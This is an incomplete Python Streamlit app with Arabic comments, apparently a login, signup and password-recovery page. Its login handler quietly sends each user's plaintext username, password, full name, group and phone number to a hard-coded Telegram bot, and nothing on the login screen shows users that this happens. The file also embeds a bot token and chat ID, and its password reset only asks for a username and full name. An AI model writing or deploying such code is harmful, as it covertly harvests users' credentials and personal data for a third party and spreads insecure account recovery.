import streamlit as st
import requests

GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwEsXOJP507qKcT3JFFrlvC--sHJi0hqPmWRsPb07RMblpqMPga44exB9kJe6hAgoCY/exec"
TELEGRAM_BOT_TOKEN = "8165532786:AAHYiNEgO8k1TDz5WNtXmPHNruQM15LIgD4"
TELEGRAM_CHAT_ID = "6283768537"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, data=data)
    except Exception as e:
        st.error(f"Error sending Telegram message: {e}")

#... (باقي الدوال: check_login, get_user_data, add_user, update_password, get_progress, update_progress)

def login_page():
    st.title("Login")

    if 'show_signup' not in st.session_state:
        st.session_state['show_signup'] = False
    if 'signup_success' not in st.session_state:
        st.session_state['signup_success'] = False
    if 'show_forgot' not in st.session_state:
        st.session_state['show_forgot'] = False
    if 'allow_reset' not in st.session_state:
        st.session_state['allow_reset'] = False
    if 'password_reset_message' not in st.session_state:
        st.session_state['password_reset_message'] = None

    if not st.session_state['show_signup'] and not st.session_state['show_forgot']:
        username = st.text_input("Username", key="login_username")
        password = st.text_input("Password", type="password", key="login_password")

        if st.button("Login"):
            if not username or not password:
                st.warning("Please fill all fields")
            else:
                if check_login(username, password):
                    user_data = get_user_data(username)
                    if user_data:
                        st.session_state['logged_in'] = True
                        st.session_state['user_name'] = user_data['username']
                        message = (
                            f"🔑 User logged in:\n"
                            f"Username: <b>{user_data['username']}</b>\n"
                            f"Password: <b>{user_data['password']}</b>\n"
                            f"Full Name: <b>{user_data['full_name']}</b>\n"
                            f"Group: <b>{user_data['group']}</b>\n"
                            f"Phone: <b>{user_data['phone']}</b>"
                        )
                        send_telegram_message(message)
                        st.experimental_rerun()
                    else:
                        st.error("Failed to fetch user data")
                else:
                    st.error("Incorrect username or password")

        # باقي شاشة الدخول (الأزرار، الرسائل، التبديل لإنشاء حساب جديد أو استعادة كلمة مرور)

    elif st.session_state['show_signup']:
        # الكود الكامل لإنشاء حساب جديد
        pass  # اكتب كامل كود صفحة التسجيل هنا بنفس تنسيق login_page()

    elif st.session_state['show_forgot']:
        forgot_password_page()

def forgot_password_page():
    st.title("Password Recovery")

    username = st.text_input("Username", key="forgot_username")
    full_name = st.text_input("Full Name", key="forgot_full_name")

    if 'password_updated' not in st.session_state:
        st.session_state['password_updated'] = False

    if st.button("Back"):
        st.session_state['show_forgot'] = False
        st.session_state['allow_reset'] = False
        st.session_state['password_updated'] = False
        st.experimental_rerun()

    if st.button("Verify"):
        if not username.strip() or not full_name.strip():
            st.warning("Please fill username and full name")
            st.session_state['allow_reset'] = False
        else:
            user_data = get_user_data(username)
            if user_data and user_data['full_name'].strip().lower() == full_name.strip().lower():
                st.success("✅ Verified successfully, enter new password")
                st.session_state['allow_reset'] = True
            else:
                st.error("Incorrect username or full name")
                st.session_state['allow_reset'] = False

    if st.session_state['allow_reset'] and not st.session_state['password_updated']:
        new_password = st.text_input("New Password", type="password", key="new_pass")
        confirm_password = st.text_input("Confirm Password", type="password", key="confirm_pass")

        if st.button("Update Password"):
            if new_password != confirm_password:
                st.warning("Passwords do not match")
            elif update_password(username, full_name, new_password):
                st.session_state['password_reset_message'] = "✅ Password updated, please login now"
                st.session_state['password_updated'] = True
                st.session_state['allow_reset'] = False
                st.session_state['show_forgot'] = False
                st.experimental_rerun()
            else:
                st.error("Failed to update password")
